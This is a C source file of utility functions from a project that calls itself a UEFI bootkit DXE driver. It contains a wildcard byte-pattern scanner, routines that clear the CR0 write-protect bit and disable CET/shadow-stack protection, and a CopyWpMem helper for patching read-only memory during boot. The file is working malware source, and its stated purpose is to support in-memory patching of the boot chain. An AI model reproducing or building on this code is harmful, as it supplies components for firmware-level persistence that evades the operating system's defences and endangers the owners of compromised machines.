/*
 * ============================================================
 *  Project  : WhiteLotus — UEFI Bootkit DXE Driver
 *  File     : Utils.c
 * ============================================================
 *
 *  Description:
 *    General-purpose utility functions shared across all DXE
 *    driver modules. Includes: byte-pattern scanner
 *    (FindPattern with wildcard support), write-protect bypass
 *    (DisableWriteProtect/EnableWriteProtect, CET/Shadow Stack
 *    aware), CopyWpMem for patching read-only memory, a
 *    UEFI timer-based sleep (RtlSleep/RtlStall), and a
 *    case-insensitive bounded wide string compare (StrniCmp).
 *
 *  Purpose:
 *    - Provide shared low-level helpers for in-memory
 *      scanning and patching throughout the boot-time chain.
 *
 *  Author   : 0xbekoo
 *  Blog     : https://0xbekoo.github.io
 *  Updated  : 2026-05-21
 *
 * ============================================================
 */

#include "WhiteLotus.h"


//
// Disables CET.
//
VOID
EFIAPI
AsmDisableCet(
    VOID
    );

VOID
EFIAPI
AsmEnableCet(
    VOID
    );


EFI_STATUS
EFIAPI
RtlStall(
	IN UINTN Milliseconds
	)
{
	ASSERT(gBS != NULL);
	return gBS->Stall(Milliseconds * 1000);
}

EFI_STATUS
EFIAPI
RtlSleep(
	IN UINTN Milliseconds
	)
{
	ASSERT(gBS != NULL);

	// Create a timer event, set its timeout, and wait for it
	EFI_EVENT TimerEvent;
	EFI_STATUS Status = gBS->CreateEvent(EVT_TIMER, 0, NULL, NULL, &TimerEvent);
	if (EFI_ERROR(Status))
		return RtlStall(Milliseconds); // Fall back to stalling CPU

	gBS->SetTimer(TimerEvent,
				TimerRelative,
				EFI_TIMER_PERIOD_MILLISECONDS(Milliseconds));

	UINTN Index;
	Status = gBS->WaitForEvent(1, &TimerEvent, &Index);
	if (EFI_ERROR(Status))
		Status = RtlStall(Milliseconds);

	gBS->CloseEvent(TimerEvent);
	return Status;
}

EFI_STATUS
EFIAPI
FindPattern(
	IN CONST UINT8* Pattern,
	IN UINT8 Wildcard,
	IN UINT32 PatternLength,
	IN CONST VOID* Base,
	IN UINT32 Size,
	OUT VOID **Found
	)
{
	if (Found == NULL || Pattern == NULL || Base == NULL)
		return EFI_INVALID_PARAMETER;

	*Found = NULL;

	for (UINT8 *Address = (UINT8*)Base; Address < (UINT8*)((UINTN)Base + Size - PatternLength); ++Address)
	{
		UINT32 i;
		for (i = 0; i < PatternLength; ++i)
		{
			if (Pattern[i] != Wildcard && (*(Address + i) != Pattern[i]))
				break;
		}

		if (i == PatternLength)
		{
			*Found = (VOID*)Address;
			return EFI_SUCCESS;
		}
	}

	return EFI_NOT_FOUND;
}

VOID
EFIAPI
DisableWriteProtect(
	OUT BOOLEAN *WpEnabled,
	OUT BOOLEAN *CetEnabled
	)
{
	CONST UINTN Cr0 = AsmReadCr0();
	*WpEnabled = (Cr0 & CR0_WP) != 0;
	*CetEnabled = (AsmReadCr4() & CR4_CET) != 0;

	if (*WpEnabled)
	{
		if (*CetEnabled)
			AsmDisableCet();
		AsmWriteCr0(Cr0 & ~CR0_WP);
	}
}

VOID
EFIAPI
EnableWriteProtect(
	IN BOOLEAN WpEnabled,
	IN BOOLEAN CetEnabled
	)
{
	if (WpEnabled)
	{
		AsmWriteCr0(AsmReadCr0() | CR0_WP);
		if (CetEnabled)
			AsmEnableCet();
	}
}

VOID*
EFIAPI
CopyWpMem(
	OUT VOID *Destination,
	IN CONST VOID *Source,
	IN UINTN Length
	)
{
	BOOLEAN WpEnabled, CetEnabled;
	DisableWriteProtect(&WpEnabled, &CetEnabled);

	VOID* Result = CopyMem(Destination, Source, Length);

	EnableWriteProtect(WpEnabled, CetEnabled);
	return Result;
}

INTN
EFIAPI
StrniCmp(
	IN CONST CHAR16 *FirstString,
	IN CONST CHAR16 *SecondString,
	IN UINTN Length
	)
{
	if (FirstString == NULL || SecondString == NULL || Length == 0)
		return 0;

	CHAR16 UpperFirstChar = CharToUpper(*FirstString);
	CHAR16 UpperSecondChar = CharToUpper(*SecondString);
	while ((*FirstString != L'\0') && (*SecondString != L'\0') &&
		(UpperFirstChar == UpperSecondChar) &&
		(Length > 1))
	{
		FirstString++;
		SecondString++;
		UpperFirstChar = CharToUpper(*FirstString);
		UpperSecondChar = CharToUpper(*SecondString);
		Length--;
	}

	return UpperFirstChar - UpperSecondChar;
}
